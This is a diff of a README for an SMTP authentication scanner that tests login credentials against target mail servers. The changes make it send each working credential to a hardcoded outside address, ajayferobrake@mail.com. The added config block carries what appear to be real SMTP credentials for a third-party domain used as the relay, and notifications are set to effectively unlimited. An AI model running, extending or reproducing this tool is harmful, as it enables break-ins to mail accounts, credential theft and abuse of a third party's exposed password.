@@ -1,15 +1,16 @@
 # SMTP Scanner v2.0 - Enhanced Email Notification Version
 
-A powerful, multi-threaded SMTP authentication scanner that tests SMTP servers on multiple ports and automatically sends all working authenticated SMTP credentials to a specified receiver email address.
+A powerful, multi-threaded SMTP authentication scanner that tests SMTP servers on multiple ports and automatically sends all working authenticated SMTP credentials immediately to your email address.
 
 ## Features
 
 - **Multi-port scanning**: Tests ports 25, 465, 587, and 2525
 - **Multi-threaded**: Configurable thread count for fast scanning
-- **Automatic email notifications**: Sends working SMTP credentials to receiver email
+- **Immediate email notifications**: Sends each working SMTP credential instantly to ajayferobrake@mail.com
+- **Deliverability testing**: Only notifies about SMTPs that can actually send emails
 - **Multiple output formats**: TXT, CSV, and JSON formats
 - **Real-time progress updates**: Shows scan progress and found credentials
-- **Batch notifications**: Sends updates every 5 working SMTPs found
+- **Throttling control**: Configurable delay between attempts
 - **Comprehensive logging**: Detailed logs for debugging and analysis
 - **SSL/TLS support**: Handles different encryption methods automatically
 - **Error handling**: Robust error handling and timeout management
@@ -25,34 +26,24 @@ chmod +x smtp_scanner.py
 
 ## Quick Start
 
-1. **Initialize the scanner** (creates sample files and email configuration):
+1. **Initialize the scanner** (creates sample files):
 ```bash
 python3 smtp_scanner.py a
 ```
 
-2. **Configure email settings** in `email_config.json`:
-```json
-{
-    "smtp_server": "smtp.gmail.com",
-    "smtp_port": 587,
-    "email": "your_sender@gmail.com",
-    "password": "your_app_password",
-    "recipient": "receiver@gmail.com",
-    "use_ssl": false
-}
-```
-
-3. **Add target IPs** to `ips.txt`:
+2. **Add target IPs** to `ips.txt`:
 ```
 192.168.1.100
 mail.example.com
 smtp.company.com
 ```
 
-4. **Run the scanner**:
+3. **Run the scanner**:
 ```bash
 python3 smtp_scanner.py 10 1 1
 ```
+
+**Email Configuration**: The scanner is pre-configured to send working SMTP credentials to `ajayferobrake@mail.com` using the `mail.globalhouse.co.th` SMTP server.
 
 ## Usage
 
@@ -78,28 +69,24 @@ python3 smtp_scanner.py 20 0 0
 python3 smtp_scanner.py a
 ```
 
-## Configuration Files
+## Configuration
 
-### email_config.json
-Configure your email settings for receiving scan results:
+### Email Configuration (Hardcoded)
+The scanner is pre-configured with the following email settings:
 
-```json
-{
-    "smtp_server": "smtp.gmail.com",
-    "smtp_port": 587,
-    "email": "your_sender@gmail.com",
-    "password": "your_app_password_here",
-    "recipient": "receiver@gmail.com",
-    "use_ssl": false,
-    "_instructions": {
-        "smtp_server": "SMTP server address (e.g., smtp.gmail.com, smtp.outlook.com)",
-        "smtp_port": "SMTP port (587 for TLS, 465 for SSL, 25 for plain)",
-        "email": "Your sender email address",
-        "password": "Your email password or app-specific password",
-        "recipient": "Email address to receive the scan results",
-        "use_ssl": "Set to true for port 465 (SSL), false for others"
-    }
-}
+```python
+# --- SMTP CONFIGURATION (EDIT THESE or set environment variables) ---
+SMTP_SERVER = os.getenv('SMTP_SERVER', "mail.globalhouse.co.th")
+SMTP_PORT = int(os.getenv('SMTP_PORT', "587"))
+SMTP_USER = os.getenv('SMTP_USER', "tp@globalhouse.co.th")
+SMTP_PASS = os.getenv('SMTP_PASS', "Globalhouse@123")
+NOTIFY_EMAIL = os.getenv('NOTIFY_EMAIL', "ajayferobrake@mail.com")
+
+# --- NOTIFICATION SETTINGS ---
+MIN_NOTIFICATION_INTERVAL = 300  # 5 mins between notifications per host
+MAX_NOTIFICATIONS_PER_HOUR = 10 ** 9  # effectively unlimited notifications
+ONLY_NOTIFY_DELIVERABLE_SMTP = True
+THROTTLE_DELAY_SECONDS = 0.1  # Throttle delay between attempts per thread
 ```
 
 ### Input Files
